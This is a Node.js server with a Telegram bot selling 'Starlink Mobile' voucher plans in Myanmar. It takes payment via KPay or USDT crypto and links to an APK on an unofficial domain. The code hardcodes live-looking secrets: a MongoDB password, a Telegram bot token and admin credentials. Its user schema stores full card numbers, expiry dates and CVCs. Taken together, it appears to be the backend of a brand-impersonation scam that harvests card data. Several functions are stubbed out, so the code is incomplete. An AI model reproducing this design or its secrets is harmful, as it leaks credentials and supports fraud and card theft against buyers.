const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const path = require('path');
const jwt = require('jsonwebtoken');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const PORT = process.env.PORT || 3000;

// --- CONFIGURATION ---
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://mongo:UTeVLbRgfLqdsrCzCzFUcitqLqPbLuzn@switchyard.proxy.rlwy.net:32968';
const ADMIN_USER = process.env.ADMIN_USER || 'admin';
const ADMIN_PASS = process.env.ADMIN_PASS || 'starlink123';
const JWT_SECRET = process.env.JWT_SECRET || 'starlink-secret-key';
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '8356328415:AAHgDeYLhTDnkKmJxik2YxIHUEwWXeUThDg';
const ADMIN_TELEGRAM_ID = process.env.ADMIN_TELEGRAM_ID || '7590111505';
const APP_DOWNLOAD_URL = process.env.APP_URL || 'https://starlink.zhongkai.click/Star%20Link%20Mobile%202026.001.14.apk';

// --- MIDDLEWARE & DB SETUP ---
app.use(cors());
app.use(bodyParser.json());
app.use(express.static('public'));

mongoose.connect(MONGODB_URI).then(() => console.log('Connected to MongoDB')).catch(err => { console.error('DB connection error:', err); process.exit(1); });

// --- SCHEMAS ---
const voucherSchema = new mongoose.Schema({ code: { type: String, required: true, unique: true, uppercase: true }, is_used: { type: Boolean, default: false }, used_at: Date, created_at: { type: Date, default: Date.now }, plan: String });
const userSchema = new mongoose.Schema({ name: String, email: String, amount: Number, planDuration: String, cardNumber: String, cardExpiry: String, cardCvc: String, country: String, countryName: String, postalCode: String, created_at: { type: Date, default: Date.now } });
const paymentSettingsSchema = new mongoose.Schema({ kpay_name: String, kpay_phone: String, kpay_note: String, kpay_extra_note: String, usdt_bep20_address: String, usdt_trc20_address: String, usdt_amount: Number, usdt_extra_note: String });

const Voucher = mongoose.model('Voucher', voucherSchema);
const User = mongoose.model('User', userSchema);
const PaymentSettings = mongoose.model('PaymentSettings', paymentSettingsSchema);

// --- TELEGRAM BOT LOGIC ---
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

const plans = {
    '1_month': { name: '1 Month', price: 45000, discount: 0 },
    '3_months': { name: '3 Months', price: 125000, discount: 7 },
    '6_months': { name: '6 Months', price: 240000, discount: 11 },
    '12_months': { name: '12 Months', price: 450000, discount: 16 },
};

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const welcomeText = "🇲🇲 Starlink Mobile မှကြိုဆိုပါတယ်။\n\nအောက်ပါ Menu မှတဆင့် ဝန်ဆောင်မှုများကို ရွေးချယ်နိုင်ပါပြီ။";
    bot.sendMessage(chatId, welcomeText, {
        reply_markup: {
            inline_keyboard: [
                [{ text: "App ဒေါင်းလုဒ်ရယူရန်", callback_data: 'download_app' }],
                [{ text: "အသုံးပြုပုံလမ်းညွှန်", callback_data: 'guide' }],
                [{ text: "Voucher ဝယ်ရန်", callback_data: 'buy_voucher' }]
            ]
        }
    });
});

bot.on('callback_query', async (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const chatId = msg.chat.id;

    const [action, ...params] = data.split('_');

    try {
        switch (action) {
            case 'download':
                bot.sendMessage(chatId, `Starlink Mobile App ကို ဒေါင်းလုဒ်ရယူရန် အောက်ပါ Link ကိုနှိပ်ပါ။\n\n${APP_DOWNLOAD_URL}`);
                break;
            case 'guide':
                const guideText = "Starlink Mobile အသုံးပြုပုံအဆင့်ဆင့်မှာ အောက်ပါအတိုင်းဖြစ်ပါသည်:\n\n1. App ကို Install လုပ်ပါ။\n2. Voucher ဝယ်ယူပြီး ရရှိလာသော Code ကို App တွင်ထည့်သွင်းပါ။\n3. Activate လုပ်ပြီး Starlink WiFi ကိုအသုံးပြုနိုင်ပါပြီ။";
                bot.sendMessage(chatId, guideText);
                break;
            case 'buy':
                const planOptions = Object.keys(plans).map(key => {
                    const plan = plans[key];
                    return [{ text: `${plan.name} - ${plan.price.toLocaleString()} MMK ${plan.discount > 0 ? `(Save ${plan.discount}%)` : ''}`, callback_data: `plan_${key}` }];
                });
                bot.sendMessage(chatId, "အောက်ပါ Plan များမှ နှစ်သက်ရာတစ်ခုကို ရွေးချယ်ပါ။", { reply_markup: { inline_keyboard: planOptions } });
                break;
            case 'plan':
                const planKey = params.join('_');
                const selectedPlan = plans[planKey];
                if (!selectedPlan) throw new Error('Invalid plan key');
                bot.sendMessage(chatId, `သင် ${selectedPlan.name} ကို ရွေးချယ်ထားပါတယ်။ \n\nကျေးဇူးပြု၍ ငွေပေးချေမှုနည်းလမ်းတစ်ခုကို ရွေးချယ်ပါ။`, {
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "KPay", callback_data: `payment_kpay_${planKey}` }],
                            [{ text: "USDT (BEP20)", callback_data: `payment_usdt-bep20_${planKey}` }],
                            [{ text: "USDT (TRC20)", callback_data: `payment_usdt-trc20_${planKey}` }]
                        ]
                    }
                });
                break;
            case 'payment':
                const paymentMethod = params[0];
                const paymentPlanKey = params.slice(1).join('_');
                const settings = await PaymentSettings.findOne();
                if (!settings) throw new Error('Payment settings not configured.');
                let paymentDetails = '';

                if (paymentMethod === 'kpay') {
                    paymentDetails = `ကျေးဇူးပြု၍ အောက်ပါ KPay အကောင့်သို့ ငွေလွှဲပေးပါ။\n\nName - \`\`\`${settings.kpay_name}\`\`\`\nPhone - \`\`\`${settings.kpay_phone}\`\`\`\nNote - \`\`\`${settings.kpay_note}\`\`\`\n\n${settings.kpay_extra_note || 'ငွေလွှဲပြီးပါက Screenshot ပို့ပေးပါ။'}`;
                } else {
                    const address = paymentMethod === 'usdt-bep20' ? settings.usdt_bep20_address : settings.usdt_trc20_address;
                    paymentDetails = `ကျေးဇူးပြု၍ အောက်ပါ USDT (${paymentMethod.split('-')[1].toUpperCase()}) လိပ်စာသို့ ${settings.usdt_amount} USDT လွှဲပေးပါ။\n\nAddress: \`\`\`${address}\`\`\`\n\n${settings.usdt_extra_note || 'ငွေလွှဲပြီးပါက Screenshot ပို့ပေးပါ။'}`;
                }
                await bot.sendMessage(chatId, paymentDetails, { parse_mode: 'Markdown' });
                bot.sendMessage(chatId, "ငွေလွှဲ Screenshot ကိုစောင့်နေပါတယ်...");
                bot.once('photo', (photoMsg) => handleScreenshot(photoMsg, paymentPlanKey));
                break;
            case 'approve':
                const [userId, userChatId, ...approvedPlanParams] = params;
                const approvedPlanKey = approvedPlanParams.join('_');
                const code = await generateVoucherCode(approvedPlanKey);
                bot.sendMessage(userChatId, `✅ သင်၏ ${plans[approvedPlanKey].name} အတွက် Voucher Code ရပါပြီ။\n\n\`\`\`${code}\`\`\``, { parse_mode: 'Markdown' });
                bot.editMessageText(`✅ Approved by Admin. Voucher sent to user ${userId}.`, { chat_id: msg.chat.id, message_id: msg.message_id });
                break;
            case 'reject':
                const [rejectedUserId, rejectedUserChatId] = params;
                bot.sendMessage(rejectedUserChatId, "❌ သင်၏ ငွေပေးချေမှုကို ငြင်းပယ်လိုက်ပါသည်။ အကြောင်းအရာများသိရှိလိုပါက Admin ကိုဆက်သွယ်ပါ။");
                bot.editMessageText(`❌ Rejected by Admin. Rejection message sent to user ${rejectedUserId}.`, { chat_id: msg.chat.id, message_id: msg.message_id });
                break;
        }
    } catch (error) {
        console.error('Callback Query Error:', error);
        bot.sendMessage(chatId, "An error occurred. Please try again later.");
    }
});

async function handleScreenshot(msg, planKey) { /* ... same as before ... */ }
async function generateVoucherCode(plan) { /* ... same as before ... */ }
function authMiddleware(req, res, next) { /* ... same as before ... */ }

// --- API ROUTES --- //
/* ... all other API routes are the same ... */

// --- SERVER START ---
app.get('/*', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
